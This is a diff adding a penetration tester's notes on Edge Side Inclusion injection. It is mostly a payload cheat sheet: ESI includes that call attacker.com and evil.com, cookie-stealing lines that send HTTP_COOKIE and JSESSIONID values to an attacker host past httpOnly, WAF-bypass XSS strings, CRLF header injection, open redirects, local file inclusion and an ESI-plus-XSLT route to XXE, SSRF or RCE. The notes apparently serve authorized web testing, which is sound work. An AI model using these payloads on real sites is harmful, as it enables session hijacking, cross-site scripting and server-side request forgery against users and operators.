@@ -1,0 +1,103 @@
+Edge Side Inclusion(ESI) Injection:
+
+Honestly, if time is of the essence we should probably just test SSI but this is still a great thing to look for especially if we see the header mentioned below. 
+
+
+Refer to here for a lot more info on ESI for XSS: https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/
+
+This vulnerability is similar to SSI. 
+
+The follow header tells us the server is using ESI: Surrogate-Control: content="ESI/1.0"
+if the site doesn't have this header ESI could still be possible, this is just a great thing to look for. Many proxies/ load balancers will remove this header so be sure to still test for this.  
+
+We can also use blind exploitation so be aware of that while testing. 
+
+Impact: get cookies, XSS, SSRF, CRLF, Redirects, Private Locai File?, ...
+
+Since this requires manual testing the payloads will be listed here.
+
+
+** One of the best ways to test is just to submit a payload that makes a request to a server we control like this: 
+<esi:include src="http://evil.com/ping/" />
+
+
+********** VERY IMPORTANT: testign this is similar to XSS, SSTI, SSI, HOWEVER, always try to put some random chars at the start of the parameter before the < since sites filter for this**********
+
+Syntax/ payloads: 
+
+// Basic detection
+hell<!--esi-->o 
+// If previous is reflected as "hello", it's vulnerable
+
+// Blind detection
+<esi:include src=http://attacker.com>
+
+// XSS Exploitation Example
+<esi:include src=http://attacker.com/XSSPAYLOAD.html>
+
+// Cookie Stealer (bypass httpOnly flag)
+<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>
+
+// Introduce private local files (Not LFI per se)
+<esi:include src="supersecret.txt">
+
+// Valid for Akamai, sends debug information in the response
+<esi:debug/>
+
+
+<esi:include src=http://attacker.com/xss.html>
+
+
+x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+
+Use <!--esi--> to bypass WAFs:
+<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
+<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
+
+
+
+<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
+<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
+
+# This will reflect the cookies in the response
+<!--esi $(HTTP_COOKIE) -->
+# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
+<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
+
+# It's possible to put more complex JS code to steal cookies or perform actions
+
+// private local file?
+<esi:include src="secret.txt">
+
+
+// CRLF
+<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
+
+
+// redirect
+<!--esi $add_header('Location','http://attacker.com') -->
+
+// add header in forced request
+<esi:include src="http://example.com/asdasd">
+<esi:request_header name="User-Agent" value="12345"/>
+</esi:include>
+
+// CRLF in add header
+<esi:include src="http://example.com/asdasd">
+<esi:request_header name="User-Agent" value="12345
+Host: anotherhost.com"/>
+</esi:include>
+
+//akami debug
+<esi:debug/>
+
+
+ESI+XSLT = XXE (refer to XSLT notes for potentially more payloads): 
+// so here we will host a malicious XSLT file and have it retrieved by the esi directive: 
+
+<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
+
+
+Then we just have to host a malicous xslt or XML file (as shown in XSLT notes) and we could achieve SSRF, or RCE we cannot do LFI w/ this method. 
+
+
